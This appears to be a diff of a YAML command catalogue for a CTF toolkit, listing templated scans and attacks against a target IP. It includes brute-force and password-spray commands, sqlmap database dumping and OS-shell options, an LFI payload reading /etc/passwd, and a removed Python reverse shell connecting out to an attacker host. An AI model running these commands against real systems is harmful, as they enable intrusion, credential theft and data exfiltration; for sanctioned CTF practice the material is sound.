@@ -1,269 +1,1296 @@
+# ============================================================================
+# TAJAA CTF ULTIMATE TOOLKIT
+# The Most Comprehensive CTF Arsenal Ever Created
+# Author: Tajaa | Version: 4.0.0
+# ============================================================================
+# This configuration contains 150+ battle-tested CTF tools organized into
+# logical categories. Each tool is optimized for real CTF scenarios.
+# ============================================================================
+
 categories:
-  network_recon:
-    name: "🔍 Network Reconnaissance"
+
+  # ==========================================================================
+  # PHASE 1: RECONNAISSANCE & ENUMERATION
+  # ==========================================================================
+
+  nmap_arsenal:
+    name: "🎯 Nmap Arsenal (15 Essential Scans)"
     tools:
-      rustscan:
-        name: "RustScan - Ultra Fast Port Scanner"
-        description: "Modern port scanner that feeds results to Nmap. Scans all 65k ports in seconds."
-        command: "rustscan -a {target_ip} -- -A -sC"
+      nmap_full_tcp:
+        name: "Full TCP Scan with Scripts (CTF Standard)"
+        description: "The #1 most used CTF scan: All ports, version detection, default scripts, saved to file"
+        command: "nmap -sC -sV -p- -oN scan.txt {target_ip}"
         params:
           - target_ip
 
-      nmap_fast:
-        name: "Nmap - Fast Scan (Top 1000)"
-        description: "Quick scan of most common 1000 ports with service detection"
-        command: "nmap -T4 -F -sV {target_ip}"
+      nmap_quick_initial:
+        name: "Quick Initial Recon (First 1000)"
+        description: "Fast first scan to find open ports quickly while full scan runs"
+        command: "nmap -sC -sV -oN initial_scan.txt {target_ip}"
         params:
           - target_ip
 
-      nmap_vuln:
-        name: "Nmap - Vulnerability Scan"
-        description: "Deep vulnerability detection using NSE scripts"
-        command: "nmap -T4 -sV --script vuln {target_ip}"
+      nmap_udp_top100:
+        name: "UDP Top 100 Ports"
+        description: "Check common UDP services (DNS, SNMP, TFTP, NTP) - often overlooked goldmine"
+        command: "sudo nmap -sU --top-ports 100 -sV -oN udp_scan.txt {target_ip}"
         params:
           - target_ip
 
-      masscan:
-        name: "Masscan - Mass IP Scanner"
-        description: "Fastest port scanner for entire networks (requires sudo)"
-        command: "sudo masscan -p1-65535 {target_ip} --rate=1000"
+      nmap_all_scripts:
+        name: "Full Script Scan (Deep Analysis)"
+        description: "Run ALL safe scripts for maximum information gathering"
+        command: "nmap -sC -sV -A -T4 -p- -oN full_script_scan.txt {target_ip}"
         params:
           - target_ip
 
-  steganography:
-    name: "🖼️ Steganography & Forensics"
+      nmap_vuln_scan:
+        name: "Vulnerability Detection Scan"
+        description: "Check for known CVEs and vulnerabilities in services"
+        command: "nmap --script vuln -p- -oN vuln_scan.txt {target_ip}"
+        params:
+          - target_ip
+
+      nmap_smb_enum:
+        name: "SMB Complete Enumeration"
+        description: "Full SMB enumeration: shares, users, OS, vulnerabilities"
+        command: "nmap -p 139,445 --script=smb-enum-shares,smb-enum-users,smb-os-discovery,smb-vuln* -oN smb_enum.txt {target_ip}"
+        params:
+          - target_ip
+
+      nmap_http_enum:
+        name: "HTTP/HTTPS Service Enumeration"
+        description: "Deep web service analysis: methods, headers, title, robots, sitemap"
+        command: "nmap -p 80,443,8080,8443 --script=http-enum,http-headers,http-methods,http-title,http-robots.txt,http-sitemap-generator -oN http_enum.txt {target_ip}"
+        params:
+          - target_ip
+
+      nmap_ftp_anon:
+        name: "FTP Anonymous Login Check"
+        description: "Check FTP for anonymous access and list files"
+        command: "nmap -p 21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor -oN ftp_scan.txt {target_ip}"
+        params:
+          - target_ip
+
+      nmap_ssh_enum:
+        name: "SSH Enumeration & Auth Methods"
+        description: "SSH version, supported auth methods, potential weaknesses"
+        command: "nmap -p 22 --script=ssh-auth-methods,ssh-hostkey,ssh-brute,ssh2-enum-algos -oN ssh_scan.txt {target_ip}"
+        params:
+          - target_ip
+
+      nmap_ldap_enum:
+        name: "LDAP/AD Enumeration"
+        description: "Active Directory and LDAP enumeration for domain info"
+        command: "nmap -p 389,636,3268,3269 --script=ldap-rootdse,ldap-search,ldap-brute -oN ldap_scan.txt {target_ip}"
+        params:
+          - target_ip
+
+      nmap_mysql_enum:
+        name: "MySQL Enumeration"
+        description: "MySQL version, databases, users, empty passwords"
+        command: "nmap -p 3306 --script=mysql-databases,mysql-empty-password,mysql-enum,mysql-info,mysql-users,mysql-vuln-cve2012-2122 -oN mysql_scan.txt {target_ip}"
+        params:
+          - target_ip
+
+      nmap_snmp_enum:
+        name: "SNMP Full Enumeration"
+        description: "SNMP community strings, system info, network interfaces"
+        command: "sudo nmap -sU -p 161 --script=snmp-brute,snmp-info,snmp-interfaces,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-services -oN snmp_scan.txt {target_ip}"
+        params:
+          - target_ip
+
+      nmap_dns_enum:
+        name: "DNS Zone Transfer & Enumeration"
+        description: "DNS records, zone transfer attempts, subdomain brute"
+        command: "nmap -p 53 --script=dns-zone-transfer,dns-brute,dns-cache-snoop,dns-service-discovery -oN dns_scan.txt {target_ip}"
+        params:
+          - target_ip
+
+      nmap_rdp_check:
+        name: "RDP Security Check"
+        description: "RDP encryption level, NLA status, known vulnerabilities"
+        command: "nmap -p 3389 --script=rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info -oN rdp_scan.txt {target_ip}"
+        params:
+          - target_ip
+
+      nmap_stealth_syn:
+        name: "Stealth SYN Scan (Firewall Bypass)"
+        description: "Stealthy TCP SYN scan with decoys and fragmentation"
+        command: "sudo nmap -sS -T2 -f --data-length 24 -D RND:5 -oN stealth_scan.txt {target_ip}"
+        params:
+          - target_ip
+
+  fast_scanners:
+    name: "⚡ Lightning Fast Scanners"
     tools:
-      exiftool:
-        name: "ExifTool - Metadata Extractor"
-        description: "Extract all EXIF metadata from images/files for hidden clues"
-        command: "exiftool {file_path}"
+      rustscan_full:
+        name: "RustScan - Scan All Ports in Seconds"
+        description: "Blazingly fast scanner, pipes to Nmap for service detection"
+        command: "rustscan -a {target_ip} --ulimit 5000 -- -A -sC"
         params:
-          - file_path
+          - target_ip
 
-      binwalk:
-        name: "Binwalk - Firmware/File Carver"
-        description: "Scan for embedded files and extract hidden data from images"
-        command: "binwalk -e {file_path}"
+      masscan_all:
+        name: "Masscan - Fastest Port Scanner"
+        description: "Scan all 65535 ports at insane speed (rate adjustable)"
+        command: "sudo masscan -p1-65535 {target_ip} --rate=1000 -oL masscan_results.txt"
         params:
-          - file_path
+          - target_ip
 
-      steghide_extract:
-        name: "Steghide - Extract Hidden Data"
-        description: "Extract secret data hidden in JPEG/BMP/WAV files"
-        command: "steghide extract -sf {file_path}"
+      masscan_to_nmap:
+        name: "Masscan → Nmap Pipeline"
+        description: "Fast discovery with Masscan, then deep scan with Nmap"
+        command: "sudo masscan -p1-65535 {target_ip} --rate=1000 -oG - | grep 'open' | awk '{print $5}' | cut -d'/' -f1 | sort -u | paste -sd, | xargs -I {{}} nmap -sCV -p {{}} -oN targeted_scan.txt {target_ip}"
         params:
-          - file_path
+          - target_ip
 
-      zsteg:
-        name: "Zsteg - PNG/BMP LSB Analysis"
-        description: "Detect LSB steganography in PNG and BMP images"
-        command: "zsteg -a {file_path}"
-        params:
-          - file_path
-
-      strings_deep:
-        name: "Strings - Deep Text Extraction"
-        description: "Extract all readable strings from binary files (min 6 chars)"
-        command: "strings -n 6 {file_path}"
-        params:
-          - file_path
-
-      foremost:
-        name: "Foremost - File Carver"
-        description: "Recover files based on headers/footers (supports many formats)"
-        command: "foremost -i {file_path} -o {output_dir}"
-        params:
-          - file_path
-          - output_dir
-
-  password_cracking:
-    name: "🔓 Password Cracking"
+  service_enum:
+    name: "🔍 Service-Specific Enumeration"
     tools:
-      john_basic:
-        name: "John the Ripper - Auto Mode"
-        description: "Crack password hashes using wordlist and rules"
+      enum4linux_full:
+        name: "Enum4Linux - Full SMB/NetBIOS Enum"
+        description: "Complete Windows/Samba enumeration: users, shares, groups, policies"
+        command: "enum4linux -a {target_ip} | tee enum4linux_output.txt"
+        params:
+          - target_ip
+
+      smbclient_list:
+        name: "SMBClient - List All Shares"
+        description: "List available SMB shares with null session"
+        command: "smbclient -L //{target_ip} -N"
+        params:
+          - target_ip
+
+      smbmap_enum:
+        name: "SMBMap - Share Permissions"
+        description: "Enumerate SMB shares and check permissions"
+        command: "smbmap -H {target_ip} -u '' -p ''"
+        params:
+          - target_ip
+
+      crackmapexec_smb:
+        name: "CrackMapExec - SMB Recon"
+        description: "SMB enumeration with CME (signing, null session, shares)"
+        command: "crackmapexec smb {target_ip} --shares -u '' -p ''"
+        params:
+          - target_ip
+
+      rpcclient_null:
+        name: "RPC Client - Null Session Enum"
+        description: "RPC enumeration with null session (users, groups, domains)"
+        command: "rpcclient -U '' -N {target_ip} -c 'enumdomusers;enumdomgroups;querydominfo'"
+        params:
+          - target_ip
+
+      snmpwalk_full:
+        name: "SNMPWalk - Full MIB Walk"
+        description: "Walk entire SNMP MIB tree for info disclosure"
+        command: "snmpwalk -c public -v2c {target_ip} | tee snmpwalk_output.txt"
+        params:
+          - target_ip
+
+      onesixtyone_brute:
+        name: "Onesixtyone - SNMP Community Brute"
+        description: "Brute force SNMP community strings"
+        command: "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {target_ip}"
+        params:
+          - target_ip
+
+      ldapsearch_anon:
+        name: "LDAPSearch - Anonymous Bind"
+        description: "LDAP anonymous enumeration for domain info"
+        command: "ldapsearch -x -H ldap://{target_ip} -b '' -s base '(objectclass=*)'"
+        params:
+          - target_ip
+
+      rpcinfo_query:
+        name: "RPCInfo - List RPC Services"
+        description: "Query RPC portmapper for available services"
+        command: "rpcinfo -p {target_ip}"
+        params:
+          - target_ip
+
+      showmount_nfs:
+        name: "Showmount - NFS Exports"
+        description: "List NFS exported directories"
+        command: "showmount -e {target_ip}"
+        params:
+          - target_ip
+
+      nfs_mount:
+        name: "Mount NFS Share"
+        description: "Mount an NFS share to local directory"
+        command: "sudo mount -t nfs {target_ip}:{remote_path} /mnt/nfs -o nolock"
+        params:
+          - target_ip
+          - remote_path
+
+  # ==========================================================================
+  # PHASE 2: WEB APPLICATION ATTACKS
+  # ==========================================================================
+
+  web_discovery:
+    name: "🌐 Web Directory & Content Discovery"
+    tools:
+      gobuster_common:
+        name: "Gobuster - Common Directories"
+        description: "Fast directory brute with common wordlist"
+        command: "gobuster dir -u http://{target_ip} -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster_common.txt"
+        params:
+          - target_ip
+
+      gobuster_big:
+        name: "Gobuster - Big Wordlist Scan"
+        description: "Thorough directory scan with larger wordlist"
+        command: "gobuster dir -u http://{target_ip} -w /usr/share/wordlists/dirb/big.txt -t 50 -x php,html,txt,bak -o gobuster_big.txt"
+        params:
+          - target_ip
+
+      gobuster_extensions:
+        name: "Gobuster - Multi-Extension Scan"
+        description: "Search for common file extensions (backup files!)"
+        command: "gobuster dir -u http://{target_ip} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,old,zip,tar.gz,sql,xml,json,config -t 50 -o gobuster_extensions.txt"
+        params:
+          - target_ip
+
+      feroxbuster_recursive:
+        name: "Feroxbuster - Recursive Scan"
+        description: "Fast recursive content discovery with auto-tune"
+        command: "feroxbuster -u http://{target_ip} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -d 3 -o feroxbuster.txt"
+        params:
+          - target_ip
+
+      ffuf_fast:
+        name: "Ffuf - Ultra Fast Fuzzing"
+        description: "Blazingly fast web fuzzer"
+        command: "ffuf -u http://{target_ip}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401,403 -o ffuf_output.json"
+        params:
+          - target_ip
+
+      dirsearch_full:
+        name: "Dirsearch - Full Scan"
+        description: "Feature-rich directory scanner with built-in wordlists"
+        command: "dirsearch -u http://{target_ip} -e php,html,txt,bak -t 50 -o dirsearch_output.txt"
+        params:
+          - target_ip
+
+      wfuzz_dirs:
+        name: "Wfuzz - Directory Fuzzing"
+        description: "Versatile fuzzer for directories and parameters"
+        command: "wfuzz -c --hc 404 -t 50 -w /usr/share/wordlists/dirb/common.txt http://{target_ip}/FUZZ"
+        params:
+          - target_ip
+
+      dirb_basic:
+        name: "Dirb - Basic Directory Scan"
+        description: "Classic directory bruteforcer"
+        command: "dirb http://{target_ip} /usr/share/wordlists/dirb/common.txt -o dirb_output.txt"
+        params:
+          - target_ip
+
+  web_analysis:
+    name: "🔎 Web Technology Analysis"
+    tools:
+      whatweb_aggressive:
+        name: "WhatWeb - Aggressive Fingerprint"
+        description: "Identify all web technologies and versions"
+        command: "whatweb -a 3 -v http://{target_ip} | tee whatweb_output.txt"
+        params:
+          - target_ip
+
+      wappalyzer_cli:
+        name: "Wappalyzer CLI - Tech Stack"
+        description: "Identify technologies used by website"
+        command: "wappalyzer http://{target_ip}"
+        params:
+          - target_ip
+
+      nikto_full:
+        name: "Nikto - Full Web Vulnerability Scan"
+        description: "Comprehensive web server vulnerability scanner"
+        command: "nikto -h http://{target_ip} -o nikto_output.txt -Format txt"
+        params:
+          - target_ip
+
+      curl_headers:
+        name: "Curl - HTTP Headers Analysis"
+        description: "Examine response headers for info leaks"
+        command: "curl -I -s http://{target_ip} | tee headers.txt"
+        params:
+          - target_ip
+
+      curl_robots:
+        name: "Curl - Grab robots.txt"
+        description: "Check robots.txt for hidden paths"
+        command: "curl -s http://{target_ip}/robots.txt | tee robots.txt"
+        params:
+          - target_ip
+
+      curl_sitemap:
+        name: "Curl - Grab sitemap.xml"
+        description: "Check sitemap for site structure"
+        command: "curl -s http://{target_ip}/sitemap.xml | tee sitemap.xml"
+        params:
+          - target_ip
+
+  web_vulns:
+    name: "💉 Web Vulnerability Exploitation"
+    tools:
+      sqlmap_auto:
+        name: "SQLmap - Automatic SQL Injection"
+        description: "Automatic SQL injection detection and exploitation"
+        command: "sqlmap -u '{target_url}' --batch --random-agent --level=3 --risk=2"
+        params:
+          - target_url
+
+      sqlmap_forms:
+        name: "SQLmap - Form-Based Injection"
+        description: "Test all forms on a page for SQL injection"
+        command: "sqlmap -u 'http://{target_ip}' --forms --batch --crawl=2"
+        params:
+          - target_ip
+
+      sqlmap_dump_all:
+        name: "SQLmap - Dump All Databases"
+        description: "Extract all database contents after finding injection"
+        command: "sqlmap -u '{target_url}' --batch --dump-all"
+        params:
+          - target_url
+
+      sqlmap_os_shell:
+        name: "SQLmap - Get OS Shell"
+        description: "Attempt to get OS shell via SQL injection"
+        command: "sqlmap -u '{target_url}' --batch --os-shell"
+        params:
+          - target_url
+
+      xsstrike_scan:
+        name: "XSStrike - XSS Detection"
+        description: "Intelligent XSS scanner with WAF bypass"
+        command: "xsstrike -u '{target_url}' --crawl"
+        params:
+          - target_url
+
+      dalfox_scan:
+        name: "Dalfox - Fast XSS Scanner"
+        description: "Super fast XSS parameter scanning"
+        command: "dalfox url '{target_url}' --silence"
+        params:
+          - target_url
+
+      commix_auto:
+        name: "Commix - Command Injection"
+        description: "Automatic command injection detection and exploitation"
+        command: "commix --url='{target_url}' --batch"
+        params:
+          - target_url
+
+      lfi_test:
+        name: "LFI Test - Local File Inclusion"
+        description: "Test for LFI with common traversal paths"
+        command: "curl -s '{target_url}?{param}=....//....//....//....//etc/passwd' | head -20"
+        params:
+          - target_url
+          - param
+
+      ssrf_test:
+        name: "SSRF Test - Server-Side Request Forgery"
+        description: "Test SSRF with internal address"
+        command: "curl -s '{target_url}?{param}=http://127.0.0.1:80' | head -50"
+        params:
+          - target_url
+          - param
+
+  cms_attacks:
+    name: "📦 CMS Exploitation"
+    tools:
+      wpscan_enum:
+        name: "WPScan - WordPress Full Enum"
+        description: "Complete WordPress enumeration: plugins, themes, users"
+        command: "wpscan --url http://{target_ip} --enumerate ap,at,u --random-user-agent"
+        params:
+          - target_ip
+
+      wpscan_password:
+        name: "WPScan - WordPress Password Attack"
+        description: "Brute force WordPress user passwords"
+        command: "wpscan --url http://{target_ip} --usernames {username} --passwords /usr/share/wordlists/rockyou.txt"
+        params:
+          - target_ip
+          - username
+
+      droopescan_cms:
+        name: "Droopescan - Drupal/Joomla/etc"
+        description: "Scanner for Drupal, Joomla, Silverstripe, Moodle"
+        command: "droopescan scan drupal -u http://{target_ip}"
+        params:
+          - target_ip
+
+      joomscan_full:
+        name: "Joomscan - Joomla Scanner"
+        description: "Complete Joomla vulnerability scanner"
+        command: "joomscan -u http://{target_ip}"
+        params:
+          - target_ip
+
+      cmsmap_scan:
+        name: "CMSMap - Multi-CMS Scanner"
+        description: "Automatic CMS detection and vulnerability scanning"
+        command: "cmsmap -t http://{target_ip}"
+        params:
+          - target_ip
+
+  # ==========================================================================
+  # PHASE 3: PASSWORD ATTACKS & CRACKING
+  # ==========================================================================
+
+  hash_cracking:
+    name: "🔓 Hash Identification & Cracking"
+    tools:
+      hash_identifier:
+        name: "Hash-Identifier - Detect Hash Type"
+        description: "Identify unknown hash types"
+        command: "hash-identifier"
+        params: []
+
+      hashid_detect:
+        name: "HashID - Hash Type Detection"
+        description: "Modern hash type identification tool"
+        command: "hashid -m '{hash_value}'"
+        params:
+          - hash_value
+
+      john_auto:
+        name: "John - Auto-Detect & Crack"
+        description: "John the Ripper with automatic hash detection"
         command: "john --wordlist=/usr/share/wordlists/rockyou.txt {hash_file}"
         params:
           - hash_file
 
       john_show:
-        name: "John - Show Cracked Passwords"
-        description: "Display already cracked passwords from john.pot"
+        name: "John - Show Cracked"
+        description: "Display previously cracked passwords"
         command: "john --show {hash_file}"
         params:
           - hash_file
 
-      hashcat_md5:
-        name: "Hashcat - MD5 Cracking"
-        description: "GPU-accelerated MD5 hash cracking with wordlist"
-        command: "hashcat -m 0 -a 0 {hash_file} /usr/share/wordlists/rockyou.txt"
+      john_rules:
+        name: "John - With Rules (Mutations)"
+        description: "Apply word mangling rules for better cracking"
+        command: "john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 {hash_file}"
         params:
           - hash_file
 
-      hashcat_ntlm:
-        name: "Hashcat - NTLM Cracking"
-        description: "Crack Windows NTLM hashes (mode 1000)"
-        command: "hashcat -m 1000 -a 0 {hash_file} /usr/share/wordlists/rockyou.txt"
+      hashcat_md5:
+        name: "Hashcat - MD5 (Mode 0)"
+        description: "GPU-accelerated MD5 cracking"
+        command: "hashcat -m 0 -a 0 {hash_file} /usr/share/wordlists/rockyou.txt --force"
+        params:
+          - hash_file
+
+      hashcat_sha1:
+        name: "Hashcat - SHA1 (Mode 100)"
+        description: "GPU-accelerated SHA1 cracking"
+        command: "hashcat -m 100 -a 0 {hash_file} /usr/share/wordlists/rockyou.txt --force"
         params:
           - hash_file
 
       hashcat_sha256:
-        name: "Hashcat - SHA256 Cracking"
-        description: "Crack SHA256 hashes with combinator attack"
-        command: "hashcat -m 1400 -a 0 {hash_file} /usr/share/wordlists/rockyou.txt"
+        name: "Hashcat - SHA256 (Mode 1400)"
+        description: "GPU-accelerated SHA256 cracking"
+        command: "hashcat -m 1400 -a 0 {hash_file} /usr/share/wordlists/rockyou.txt --force"
         params:
           - hash_file
 
+      hashcat_sha512:
+        name: "Hashcat - SHA512 (Mode 1700)"
+        description: "GPU-accelerated SHA512 cracking"
+        command: "hashcat -m 1700 -a 0 {hash_file} /usr/share/wordlists/rockyou.txt --force"
+        params:
+          - hash_file
+
+      hashcat_ntlm:
+        name: "Hashcat - NTLM (Mode 1000)"
+        description: "Crack Windows NTLM hashes"
+        command: "hashcat -m 1000 -a 0 {hash_file} /usr/share/wordlists/rockyou.txt --force"
+        params:
+          - hash_file
+
+      hashcat_bcrypt:
+        name: "Hashcat - bcrypt (Mode 3200)"
+        description: "Crack bcrypt hashes (slow but powerful)"
+        command: "hashcat -m 3200 -a 0 {hash_file} /usr/share/wordlists/rockyou.txt --force"
+        params:
+          - hash_file
+
+      hashcat_wordpress:
+        name: "Hashcat - WordPress MD5 (Mode 400)"
+        description: "Crack WordPress password hashes"
+        command: "hashcat -m 400 -a 0 {hash_file} /usr/share/wordlists/rockyou.txt --force"
+        params:
+          - hash_file
+
+      hashcat_shadow:
+        name: "Hashcat - Linux Shadow sha512crypt (Mode 1800)"
+        description: "Crack Linux /etc/shadow hashes"
+        command: "hashcat -m 1800 -a 0 {hash_file} /usr/share/wordlists/rockyou.txt --force"
+        params:
+          - hash_file
+
+  brute_force:
+    name: "🔐 Online Brute Force Attacks"
+    tools:
       hydra_ssh:
         name: "Hydra - SSH Brute Force"
-        description: "Brute force SSH login with username and wordlist"
-        command: "hydra -l {username} -P /usr/share/wordlists/rockyou.txt ssh://{target_ip}"
+        description: "SSH password brute force attack"
+        command: "hydra -l {username} -P /usr/share/wordlists/rockyou.txt ssh://{target_ip} -t 4"
         params:
           - username
           - target_ip
 
-  crypto_analysis:
+      hydra_ftp:
+        name: "Hydra - FTP Brute Force"
+        description: "FTP password brute force attack"
+        command: "hydra -l {username} -P /usr/share/wordlists/rockyou.txt ftp://{target_ip}"
+        params:
+          - username
+          - target_ip
+
+      hydra_smb:
+        name: "Hydra - SMB Brute Force"
+        description: "Windows SMB password attack"
+        command: "hydra -l {username} -P /usr/share/wordlists/rockyou.txt smb://{target_ip}"
+        params:
+          - username
+          - target_ip
+
+      hydra_http_post:
+        name: "Hydra - HTTP POST Form Attack"
+        description: "Web login form brute force"
+        command: "hydra -l {username} -P /usr/share/wordlists/rockyou.txt {target_ip} http-post-form '{login_path}:{post_data}:{fail_string}'"
+        params:
+          - username
+          - target_ip
+          - login_path
+          - post_data
+          - fail_string
+
+      hydra_http_basic:
+        name: "Hydra - HTTP Basic Auth"
+        description: "HTTP Basic authentication brute force"
+        command: "hydra -l {username} -P /usr/share/wordlists/rockyou.txt {target_ip} http-get {path}"
+        params:
+          - username
+          - target_ip
+          - path
+
+      hydra_rdp:
+        name: "Hydra - RDP Brute Force"
+        description: "Windows Remote Desktop brute force"
+        command: "hydra -l {username} -P /usr/share/wordlists/rockyou.txt rdp://{target_ip}"
+        params:
+          - username
+          - target_ip
+
+      hydra_mysql:
+        name: "Hydra - MySQL Brute Force"
+        description: "MySQL database password attack"
+        command: "hydra -l {username} -P /usr/share/wordlists/rockyou.txt mysql://{target_ip}"
+        params:
+          - username
+          - target_ip
+
+      medusa_ssh:
+        name: "Medusa - SSH Parallel Attack"
+        description: "Parallel SSH brute force with Medusa"
+        command: "medusa -h {target_ip} -u {username} -P /usr/share/wordlists/rockyou.txt -M ssh -t 4"
+        params:
+          - target_ip
+          - username
+
+      crackmapexec_spray:
+        name: "CrackMapExec - Password Spray"
+        description: "SMB password spray attack (careful with lockouts!)"
+        command: "crackmapexec smb {target_ip} -u {userlist} -p '{password}' --continue-on-success"
+        params:
+          - target_ip
+          - userlist
+          - password
+
+  # ==========================================================================
+  # PHASE 4: STEGANOGRAPHY & FORENSICS
+  # ==========================================================================
+
+  stego_analysis:
+    name: "🖼️ Steganography Analysis"
+    tools:
+      exiftool_all:
+        name: "ExifTool - Full Metadata"
+        description: "Extract ALL metadata from any file (images, PDFs, docs)"
+        command: "exiftool -a -u -g1 {file_path}"
+        params:
+          - file_path
+
+      binwalk_extract:
+        name: "Binwalk - Extract Embedded Files"
+        description: "Scan and extract hidden files from images/binaries"
+        command: "binwalk -e {file_path}"
+        params:
+          - file_path
+
+      binwalk_entropy:
+        name: "Binwalk - Entropy Analysis"
+        description: "Analyze entropy to detect encryption/compression"
+        command: "binwalk -E {file_path}"
+        params:
+          - file_path
+
+      steghide_extract:
+        name: "Steghide - Extract Hidden Data"
+        description: "Extract data hidden in JPEG/BMP/WAV/AU files"
+        command: "steghide extract -sf {file_path}"
+        params:
+          - file_path
+
+      steghide_info:
+        name: "Steghide - File Info"
+        description: "Display info about embedded data without extracting"
+        command: "steghide info {file_path}"
+        params:
+          - file_path
+
+      zsteg_analyze:
+        name: "Zsteg - PNG/BMP LSB Analysis"
+        description: "Detect LSB steganography in PNG/BMP images"
+        command: "zsteg -a {file_path}"
+        params:
+          - file_path
+
+      stegsolve_open:
+        name: "Stegsolve - Visual Analysis"
+        description: "Open image in Stegsolve for visual analysis"
+        command: "java -jar /opt/stegsolve/stegsolve.jar {file_path}"
+        params:
+          - file_path
+
+      strings_all:
+        name: "Strings - Extract Text (All Encodings)"
+        description: "Extract ASCII and Unicode strings from binary"
+        command: "strings -a -n 6 {file_path} | tee strings_output.txt"
+        params:
+          - file_path
+
+      xxd_hex:
+        name: "XXD - Hex Dump"
+        description: "Create hexdump of file for manual analysis"
+        command: "xxd {file_path} | head -100"
+        params:
+          - file_path
+
+      foremost_carve:
+        name: "Foremost - File Carving"
+        description: "Recover files based on headers, footers, and data structures"
+        command: "foremost -i {file_path} -o foremost_output"
+        params:
+          - file_path
+
+      scalpel_carve:
+        name: "Scalpel - Advanced File Carving"
+        description: "High-performance file carving utility"
+        command: "scalpel -b -o scalpel_output {file_path}"
+        params:
+          - file_path
+
+      pngcheck_verify:
+        name: "PNGcheck - PNG Integrity"
+        description: "Check PNG file integrity and structure"
+        command: "pngcheck -v {file_path}"
+        params:
+          - file_path
+
+      identify_image:
+        name: "ImageMagick Identify - Image Details"
+        description: "Display detailed image information"
+        command: "identify -verbose {file_path}"
+        params:
+          - file_path
+
+  audio_stego:
+    name: "🔊 Audio Steganography"
+    tools:
+      sonic_visualiser:
+        name: "Sonic Visualiser - Spectrogram"
+        description: "View audio spectrogram for hidden images"
+        command: "sonic-visualiser {file_path}"
+        params:
+          - file_path
+
+      audacity_open:
+        name: "Audacity - Audio Analysis"
+        description: "Open audio file in Audacity for analysis"
+        command: "audacity {file_path}"
+        params:
+          - file_path
+
+      deepsound_extract:
+        name: "DeepSound - Extract from Audio"
+        description: "Extract hidden files from audio (if DeepSound used)"
+        command: "deepsound {file_path}"
+        params:
+          - file_path
+
+  # ==========================================================================
+  # PHASE 5: CRYPTOGRAPHY
+  # ==========================================================================
+
+  crypto_tools:
     name: "🔐 Cryptography Tools"
     tools:
-      hash_identifier:
-        name: "Hash-Identifier - Detect Hash Type"
-        description: "Identify hash type (MD5, SHA1, NTLM, etc.)"
-        command: "hash-identifier"
-        params: []
-
       base64_decode:
-        name: "Base64 - Decode String"
+        name: "Base64 - Decode"
         description: "Decode base64 encoded string"
-        command: "echo {encoded_string} | base64 -d"
+        command: "echo '{encoded}' | base64 -d"
         params:
-          - encoded_string
+          - encoded
 
-      openssl_aes_decrypt:
-        name: "OpenSSL - AES256 Decrypt"
-        description: "Decrypt AES256 encrypted file"
-        command: "openssl enc -aes-256-cbc -d -in {encrypted_file} -out {output_file}"
+      base64_encode:
+        name: "Base64 - Encode"
+        description: "Encode string to base64"
+        command: "echo -n '{plaintext}' | base64"
+        params:
+          - plaintext
+
+      base32_decode:
+        name: "Base32 - Decode"
+        description: "Decode base32 encoded string"
+        command: "echo '{encoded}' | base32 -d"
+        params:
+          - encoded
+
+      hex_decode:
+        name: "Hex - Decode"
+        description: "Convert hex to ASCII"
+        command: "echo '{hex_string}' | xxd -r -p"
+        params:
+          - hex_string
+
+      rot13_decode:
+        name: "ROT13 - Decode/Encode"
+        description: "Apply ROT13 cipher (same for encode/decode)"
+        command: "echo '{text}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'"
+        params:
+          - text
+
+      caesar_brute:
+        name: "Caesar - Brute Force All Rotations"
+        description: "Try all 26 Caesar cipher rotations"
+        command: "for i in $(seq 0 25); do echo \"Shift $i:\"; echo '{ciphertext}' | tr $(printf '%s' {{A..Z}} {{a..z}} | head -c $((52-i*2)))$(printf '%s' {{A..Z}} {{a..z}} | tail -c $((i*2))) $(printf '%s' {{A..Z}} {{a..z}}); done"
+        params:
+          - ciphertext
+
+      openssl_aes_dec:
+        name: "OpenSSL - AES Decrypt"
+        description: "Decrypt AES-256-CBC encrypted file"
+        command: "openssl enc -aes-256-cbc -d -in {encrypted_file} -out {output_file} -k {password}"
         params:
           - encrypted_file
           - output_file
+          - password
+
+      gpg_decrypt:
+        name: "GPG - Decrypt File"
+        description: "Decrypt GPG encrypted file"
+        command: "gpg -d {encrypted_file}"
+        params:
+          - encrypted_file
 
       cyberchef_local:
-        name: "CyberChef (Local HTML)"
-        description: "Opens local CyberChef in Firefox (Requires install_arsenal.sh run)"
-        command: "bash -c 'if [ -f /opt/tajaa-tools/cyberchef/CyberChef.html ]; then firefox /opt/tajaa-tools/cyberchef/CyberChef.html; else echo \"[!] CyberChef not found. Please run install_arsenal.sh\"; fi'"
+        name: "CyberChef (Local)"
+        description: "Open local CyberChef for complex encoding/crypto"
+        command: "bash -c 'if [ -f /opt/tajaa-tools/cyberchef/CyberChef.html ]; then firefox /opt/tajaa-tools/cyberchef/CyberChef.html; else echo \"[!] CyberChef not found. Run install_arsenal.sh\"; fi'"
         params: []
 
-  reverse_shells:
-    name: "🐚 Reverse Shells & Payloads"
+      rsactftool_attack:
+        name: "RsaCtfTool - RSA Attack"
+        description: "Automatic RSA attacks (Wiener, Fermat, etc.)"
+        command: "python3 /opt/RsaCtfTool/RsaCtfTool.py --publickey {public_key} --private"
+        params:
+          - public_key
+
+      factordb_check:
+        name: "FactorDB - Check Factorization"
+        description: "Check if RSA modulus is factored in FactorDB"
+        command: "curl -s 'http://factordb.com/api?query={modulus}'"
+        params:
+          - modulus
+
+  # ==========================================================================
+  # PHASE 6: REVERSE ENGINEERING
+  # ==========================================================================
+
+  binary_analysis:
+    name: "⚙️ Binary Analysis"
     tools:
-      python_shell:
-        name: "Python - Reverse Shell"
-        description: "Spawn Python reverse shell to attacker machine"
-        command: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+      file_type:
+        name: "File - Identify Type"
+        description: "Determine file type and architecture"
+        command: "file {file_path}"
